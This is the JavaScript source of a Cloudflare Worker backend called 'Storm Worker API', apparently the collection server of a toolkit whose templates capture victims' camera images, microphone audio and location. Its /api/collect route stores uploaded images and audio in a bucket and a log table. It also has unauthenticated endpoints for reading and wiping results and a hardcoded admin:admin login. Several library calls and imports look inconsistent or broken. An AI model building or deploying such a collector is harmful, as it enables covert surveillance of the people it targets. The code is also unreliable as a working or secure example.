import { Hono } from 'hono';
import { z } from 'zod';
import {	ApiException,
   		Arr,
   		Bool,
   		CreateEndpoint,
   		D1CreateEndpoint,
   		D1DeleteEndpoint,
   		D1ListEndpoint,
   		D1ReadEndpoint,
   		D1UpdateEndpoint,
   		DateOnly,
   		DateTime,
   		DeleteEndpoint,
   		Email,
   		Enumeration,
   		HonoOpenAPIHandler,
   		Hostname,
   		InputValidationException,
   		Int,
   		Ip,
   		Ipv4,
   		Ipv6,
   		IttyRouterOpenAPIHandler,
   		ListEndpoint,
   		MetaGenerator,
		MultiException,
		NotFoundException,
		Num,
		Obj,
		OpenAPIHandler,
		OpenAPIRegistryMerger,
		OpenAPIRoute,
		ReadEndpoint,
		Regex,
		Str,
		UpdateEndpoint,
		Uuid,
		coerceInputs,
		contentJson,
		convertParams,
        	extendZodWithOpenApi,
   		fromHono,
   		fromIttyRouter,
   		getReDocUI,
   		getSwaggerUI,
   		isAnyZodType,
   		isSpecificZodType,
   		jsonResp,
	legacyTypeIntoZod,
} from 'chanfana';

// Define OpenAPI details
const openapi = chanfana({
  openapi: '3.1.0',
  info: {
    title: 'Storm Worker API',
    version: '1.0.0',
  },
});

const app = new Hono();

// --- Middleware for OpenAPI Docs ---
app.use('/docs', openapi.showDocs());
app.use('/openapi.json', openapi.showJSON());

// --- Schemas ---
const LoginSchema = z.object({
  username: z.string(),
  password: z.string(),
});

const CollectSchema = z.object({
    template: z.string(),
    data: z.any(),
});

// --- Authentication ---
const USERS = {
  admin: 'admin',
};

app.post('/api/login', openapi.json(LoginSchema), async (c) => {
  const { username, password } = c.req.valid('json');
  if (USERS[username] === password) {
    return c.json({ success: true, token: 'dummy-token' });
  }
  return c.json({ success: false }, 401);
});

// --- General Data Collection ---
app.get('/api/results', async (c) => {
    try {
        const { results } = await c.env.DB.prepare('SELECT * FROM logs ORDER BY timestamp DESC').all();
        return c.json(results);
    } catch (e) {
        console.error(e);
        return c.json({ success: false, error: 'Failed to read from database.' }, 500);
    }
});

app.post('/api/clear', async (c) => {
    try {
        await c.env.DB.prepare('DELETE FROM logs').run();
        return c.json({ success: true });
    } catch (e) {
        console.error(e);
        return c.json({ success: false, error: 'Failed to clear database.' }, 500);
    }
});

app.post('/api/collect', openapi.json(CollectSchema), async (c) => {
    const { template, data } = c.req.valid('json');

    try {
        let fileUrl = null;
        let logData = data;

        function base64ToArrayBuffer(value) {
            if (typeof value !== 'string') {
                throw new Error('Expected base64 string.');
            }

            const base64 = value.includes(',') ? value.split(',')[1] : value;
            const binaryString = atob(base64);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            return bytes.buffer;
        }

        // Handle file uploads for specific templates
        if (template === 'camera_temp' && data.image) {
            const key = `image-${Date.now()}.png`;
            const body = base64ToArrayBuffer(data.image);
            await c.env.BUCKET.put(key, body, { httpMetadata: { contentType: 'image/png' } });
            fileUrl = `/r2/${key}`;
            logData = { ...data, imageUrl: fileUrl, image: undefined }; // Remove large data from log
        } else if (template === 'microphone' && data.audio) {
            const key = `audio-${Date.now()}.wav`;
            const body = base64ToArrayBuffer(data.audio);
            await c.env.BUCKET.put(key, body, { httpMetadata: { contentType: 'audio/wav' } });
            fileUrl = `/r2/${key}`;
            logData = { ...data, audioUrl: fileUrl, audio: undefined }; // Remove large data from log
        }

        // Log metadata to D1
        const stmt = c.env.DB.prepare(
            'INSERT INTO logs (template, data) VALUES (?, ?)'
        ).bind(template, JSON.stringify(logData));
        await stmt.run();

        return c.text('Data collected successfully.');
    } catch (e) {
        console.error(e);
        return c.json({ success: false, error: 'Failed to write to database/bucket. Make sure you have run migrations and configured bindings.' }, 500);
    }
});

// --- R2 File Serving ---
app.get('/r2/:key', async (c) => {
    const key = c.req.param('key');
    const object = await c.env.BUCKET.get(key);

    if (object === null) {
        return c.notFound();
    }

    const headers = new Headers();
    object.writeHttpMetadata(headers);
    headers.set('etag', object.httpEtag);

    return new Response(object.body, {
        headers,
    });
});

// --- Template Listing ---
app.get('/api/templates', (c) => {
  const templates = [
    "camera_temp",
    "microphone",
    "nearyou",
    "normal_data",
    "weather",
  ];
  return c.json(templates);
});

// NOTE: Streaming routes moved to `src/index.js` and now use Cloudflare Stream (WHIP/WHEP).

// --- Static Asset Serving ---
// This should be the last route
app.get('*', (c) => {
  return c.env.ASSETS.fetch(c.req.raw);
});

export default app;
